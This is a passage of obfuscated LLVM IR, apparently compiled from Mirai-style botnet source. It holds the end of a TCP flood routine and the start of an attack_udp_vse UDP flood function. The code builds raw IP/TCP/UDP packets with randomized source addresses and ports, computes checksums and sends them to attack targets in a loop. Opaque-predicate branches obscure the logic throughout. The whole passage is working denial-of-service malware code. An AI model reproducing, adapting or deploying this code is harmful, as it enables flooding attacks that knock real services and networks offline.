  %403 = load i32, i32* @x.27
  %404 = load i32, i32* @y.28
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %402
  %411 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %412 = load i32, i32* %9, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 1
  %416 = load i32, i32* %415, align 4
  %417 = call i32 @ntohl(i32 %416) #7
  %418 = call i32 @rand_next()
  %419 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 2
  %424 = load i8, i8* %423, align 4
  %425 = zext i8 %424 to i32
  %426 = lshr i32 %418, %425
  %427 = add i32 %417, %426
  %428 = call i32 @htonl(i32 %427) #7
  %429 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 9
  store i32 %428, i32* %430, align 4
  %431 = load i32, i32* @x.27
  %432 = load i32, i32* @y.28
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart235, label %originalBB24alteredBB

originalBBpart235:                                ; preds = %originalBB24
  br label %439

; <label>:439:                                    ; preds = %originalBBpart235, %originalBBpart222
  %440 = load i32, i32* %26, align 4
  %441 = icmp eq i32 %440, -1
  br i1 %441, label %442, label %446

; <label>:442:                                    ; preds = %439
  %443 = call i32 @rand_next()
  %444 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i32 0, i32 8
  store i32 %443, i32* %445, align 4
  br label %446

; <label>:446:                                    ; preds = %442, %439
  %447 = load i16, i16* %13, align 2
  %448 = zext i16 %447 to i32
  %449 = icmp eq i32 %448, 65535
  br i1 %449, label %450, label %472

; <label>:450:                                    ; preds = %446
  %451 = load i32, i32* @x.27
  %452 = load i32, i32* @y.28
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %450
  %459 = call i32 @rand_next()
  %460 = and i32 %459, 65535
  %461 = trunc i32 %460 to i16
  %462 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 3
  store i16 %461, i16* %463, align 4
  %464 = load i32, i32* @x.27
  %465 = load i32, i32* @y.28
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart244, label %originalBB37alteredBB

originalBBpart244:                                ; preds = %originalBB37
  br label %472

; <label>:472:                                    ; preds = %originalBBpart244, %446
  %473 = load i16, i16* %16, align 2
  %474 = zext i16 %473 to i32
  %475 = icmp eq i32 %474, 65535
  br i1 %475, label %476, label %498

; <label>:476:                                    ; preds = %472
  %477 = load i32, i32* @x.27
  %478 = load i32, i32* @y.28
  %479 = sub i32 %477, 1
  %480 = mul i32 %477, %479
  %481 = urem i32 %480, 2
  %482 = icmp eq i32 %481, 0
  %483 = icmp slt i32 %478, 10
  %484 = or i1 %482, %483
  br i1 %484, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %476
  %485 = call i32 @rand_next()
  %486 = and i32 %485, 65535
  %487 = trunc i32 %486 to i16
  %488 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 0
  store i16 %487, i16* %489, align 4
  %490 = load i32, i32* @x.27
  %491 = load i32, i32* @y.28
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart259, label %originalBB46alteredBB

originalBBpart259:                                ; preds = %originalBB46
  br label %498

; <label>:498:                                    ; preds = %originalBBpart259, %472
  %499 = load i16, i16* %17, align 2
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  br i1 %501, label %502, label %508

; <label>:502:                                    ; preds = %498
  %503 = call i32 @rand_next()
  %504 = and i32 %503, 65535
  %505 = trunc i32 %504 to i16
  %506 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 1
  store i16 %505, i16* %507, align 2
  br label %508

; <label>:508:                                    ; preds = %502, %498
  %509 = load i32, i32* %18, align 4
  %510 = icmp eq i32 %509, 65535
  br i1 %510, label %511, label %515

; <label>:511:                                    ; preds = %508
  %512 = call i32 @rand_next()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 2
  store i32 %512, i32* %514, align 4
  br label %515

; <label>:515:                                    ; preds = %511, %508
  %516 = load i32, i32* %19, align 4
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %515
  %519 = call i32 @rand_next()
  %520 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 3
  store i32 %519, i32* %521, align 4
  br label %522

; <label>:522:                                    ; preds = %518, %515
  %523 = load i32, i32* @x.27
  %524 = load i32, i32* @y.28
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %522
  %531 = load i8, i8* %20, align 1
  %532 = icmp ne i8 %531, 0
  %533 = load i32, i32* @x.27
  %534 = load i32, i32* @y.28
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %532, label %541, label %547

; <label>:541:                                    ; preds = %originalBBpart263
  %542 = call i32 @rand_next()
  %543 = and i32 %542, 65535
  %544 = trunc i32 %543 to i16
  %545 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 7
  store i16 %544, i16* %546, align 2
  br label %547

; <label>:547:                                    ; preds = %541, %originalBBpart263
  %548 = load i32, i32* @x.27
  %549 = load i32, i32* @y.28
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %547
  %556 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 0, i16* %557, align 2
  %558 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %559 = bitcast %struct.iphdr* %558 to i16*
  %560 = call zeroext i16 @checksum_generic(i16* %559, i32 20)
  %561 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %562 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %561, i32 0, i32 7
  store i16 %560, i16* %562, align 2
  %563 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %564 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %563, i32 0, i32 6
  store i16 0, i16* %564, align 4
  %565 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %566 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %567 = bitcast %struct.tcphdr* %566 to i8*
  %568 = call zeroext i16 @htons(i16 zeroext 40) #7
  %569 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %565, i8* %567, i16 zeroext %568, i32 40)
  %570 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 6
  store i16 %569, i16* %571, align 4
  %572 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %573 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %572, i32 0, i32 1
  %574 = load i16, i16* %573, align 2
  %575 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %576 = load i32, i32* %9, align 4
  %577 = sext i32 %576 to i64
  %578 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %575, i64 %577
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %578, i32 0, i32 0
  %580 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %579, i32 0, i32 1
  store i16 %574, i16* %580, align 2
  %581 = load i32, i32* %10, align 4
  %582 = load i8*, i8** %32, align 8
  %583 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %584 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %585 = load i32, i32* %9, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %584, i64 %586
  %588 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i32 0, i32 0
  %589 = bitcast %struct.sockaddr_in* %588 to %struct.sockaddr*
  store %struct.sockaddr* %589, %struct.sockaddr** %583, align 8
  %590 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %591 = load %struct.sockaddr*, %struct.sockaddr** %590, align 8
  %592 = call i64 @sendto(i32 %581, i8* %582, i64 60, i32 16384, %struct.sockaddr* %591, i32 16)
  %593 = load i32, i32* @x.27
  %594 = load i32, i32* @y.28
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %601

; <label>:601:                                    ; preds = %originalBBpart267
  %602 = load i32, i32* %9, align 4
  %603 = add nsw i32 %602, 1
  store i32 %603, i32* %9, align 4
  br label %362

; <label>:604:                                    ; preds = %362
  br label %345

; <label>:605:                                    ; preds = %106, %100
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %110
  %606 = load i32, i32* %9, align 4
  %607 = load i8, i8* %5, align 1
  %608 = zext i8 %607 to i32
  %609 = icmp slt i32 %606, %608
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %180
  %610 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %611 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %612 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %611, i32 0, i32 4
  store i16 %610, i16* %612, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %325
  %613 = load i32, i32* %9, align 4
  %_ = sub i32 0, %613
  %gen = add i32 %_, 1
  %_7 = sub i32 %613, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %613
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %613, 1
  %gen12 = mul i32 %_11, 1
  %614 = add nsw i32 %613, 1
  store i32 %614, i32* %9, align 4
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %345
  store i32 0, i32* %9, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %367
  %615 = load i8**, i8*** %11, align 8
  %616 = load i32, i32* %9, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds i8*, i8** %615, i64 %617
  %619 = load i8*, i8** %618, align 8
  store i8* %619, i8** %32, align 8
  %620 = load i8*, i8** %32, align 8
  %621 = bitcast i8* %620 to %struct.iphdr*
  store %struct.iphdr* %621, %struct.iphdr** %33, align 8
  %622 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %623 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %622, i64 1
  %624 = bitcast %struct.iphdr* %623 to %struct.tcphdr*
  store %struct.tcphdr* %624, %struct.tcphdr** %34, align 8
  %625 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %626 = load i32, i32* %9, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %625, i64 %627
  %629 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i32 0, i32 2
  %630 = load i8, i8* %629, align 4
  %631 = zext i8 %630 to i32
  %632 = icmp slt i32 %631, 32
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %402
  %633 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %634 = load i32, i32* %9, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %633, i64 %635
  %637 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %636, i32 0, i32 1
  %638 = load i32, i32* %637, align 4
  %639 = call i32 @ntohl(i32 %638) #7
  %640 = call i32 @rand_next()
  %641 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %642 = load i32, i32* %9, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %641, i64 %643
  %645 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %644, i32 0, i32 2
  %646 = load i8, i8* %645, align 4
  %647 = zext i8 %646 to i32
  %_25 = shl i32 %640, %647
  %_26 = shl i32 %640, %647
  %_27 = shl i32 %640, %647
  %648 = lshr i32 %640, %647
  %_28 = sub i32 %639, %648
  %gen29 = mul i32 %_28, %648
  %_30 = sub i32 %639, %648
  %gen31 = mul i32 %_30, %648
  %_32 = sub i32 %639, %648
  %gen33 = mul i32 %_32, %648
  %649 = add i32 %639, %648
  %650 = call i32 @htonl(i32 %649) #7
  %651 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %652 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %651, i32 0, i32 9
  store i32 %650, i32* %652, align 4
  br label %originalBB24

originalBB37alteredBB:                            ; preds = %originalBB37, %450
  %653 = call i32 @rand_next()
  %_38 = shl i32 %653, 65535
  %_39 = shl i32 %653, 65535
  %_40 = shl i32 %653, 65535
  %_41 = shl i32 %653, 65535
  %_42 = shl i32 %653, 65535
  %654 = and i32 %653, 65535
  %655 = trunc i32 %654 to i16
  %656 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %657 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %656, i32 0, i32 3
  store i16 %655, i16* %657, align 4
  br label %originalBB37

originalBB46alteredBB:                            ; preds = %originalBB46, %476
  %658 = call i32 @rand_next()
  %_47 = sub i32 0, %658
  %gen48 = add i32 %_47, 65535
  %_49 = shl i32 %658, 65535
  %_50 = sub i32 %658, 65535
  %gen51 = mul i32 %_50, 65535
  %_52 = sub i32 %658, 65535
  %gen53 = mul i32 %_52, 65535
  %_54 = sub i32 0, %658
  %gen55 = add i32 %_54, 65535
  %_56 = sub i32 0, %658
  %gen57 = add i32 %_56, 65535
  %659 = and i32 %658, 65535
  %660 = trunc i32 %659 to i16
  %661 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  store i16 %660, i16* %662, align 4
  br label %originalBB46

originalBB61alteredBB:                            ; preds = %originalBB61, %522
  %663 = load i8, i8* %20, align 1
  %664 = icmp ne i8 %663, 0
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %547
  %665 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 7
  store i16 0, i16* %666, align 2
  %667 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %668 = bitcast %struct.iphdr* %667 to i16*
  %669 = call zeroext i16 @checksum_generic(i16* %668, i32 20)
  %670 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %671 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %670, i32 0, i32 7
  store i16 %669, i16* %671, align 2
  %672 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %673 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %672, i32 0, i32 6
  store i16 0, i16* %673, align 4
  %674 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %675 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %676 = bitcast %struct.tcphdr* %675 to i8*
  %677 = call zeroext i16 @htons(i16 zeroext 40) #7
  %678 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %674, i8* %676, i16 zeroext %677, i32 40)
  %679 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %680 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %679, i32 0, i32 6
  store i16 %678, i16* %680, align 4
  %681 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %682 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %681, i32 0, i32 1
  %683 = load i16, i16* %682, align 2
  %684 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %685 = load i32, i32* %9, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %684, i64 %686
  %688 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %687, i32 0, i32 0
  %689 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %688, i32 0, i32 1
  store i16 %683, i16* %689, align 2
  %690 = load i32, i32* %10, align 4
  %691 = load i8*, i8** %32, align 8
  %692 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %693 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %694 = load i32, i32* %9, align 4
  %695 = sext i32 %694 to i64
  %696 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %693, i64 %695
  %697 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %696, i32 0, i32 0
  %698 = bitcast %struct.sockaddr_in* %697 to %struct.sockaddr*
  store %struct.sockaddr* %698, %struct.sockaddr** %692, align 8
  %699 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %700 = load %struct.sockaddr*, %struct.sockaddr** %699, align 8
  %701 = call i64 @sendto(i32 %690, i8* %691, i64 60, i32 16384, %struct.sockaddr* %700, i32 16)
  br label %originalBB65
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 54)
  %55 = call i8* @table_retrieve_val(i32 54, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %75

; <label>:58:                                     ; preds = %4
  %59 = load i32, i32* @x.29
  %60 = load i32, i32* @y.30
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  %67 = load i32, i32* @x.29
  %68 = load i32, i32* @y.30
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %400

; <label>:75:                                     ; preds = %4
  %76 = load i32, i32* @x.29
  %77 = load i32, i32* @y.30
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  store i32 1, i32* %9, align 4
  %84 = load i32, i32* %10, align 4
  %85 = bitcast i32* %9 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  %88 = load i32, i32* @x.29
  %89 = load i32, i32* @y.30
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %87, label %96, label %99

; <label>:96:                                     ; preds = %originalBBpart24
  %97 = load i32, i32* %10, align 4
  %98 = call i32 @close(i32 %97)
  br label %400

; <label>:99:                                     ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %100

; <label>:100:                                    ; preds = %originalBBpart260, %99
  %101 = load i32, i32* %9, align 4
  %102 = load i8, i8* %5, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp slt i32 %101, %103
  br i1 %104, label %105, label %227

; <label>:105:                                    ; preds = %100
  %106 = load i32, i32* @x.29
  %107 = load i32, i32* @y.30
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %105
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %20, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %21, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to i8*
  store i8* %130, i8** %22, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %19, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, %145
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %13, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %14, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %15, align 1
  %159 = icmp ne i8 %158, 0
  %160 = load i32, i32* @x.29
  %161 = load i32, i32* @y.30
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart248, label %originalBB6alteredBB

originalBBpart248:                                ; preds = %originalBB6
  br i1 %159, label %168, label %172

; <label>:168:                                    ; preds = %originalBBpart248
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  br label %172

; <label>:172:                                    ; preds = %168, %originalBBpart248
  %173 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 17, i8* %174, align 1
  %175 = load i32, i32* @LOCAL_ADDR, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
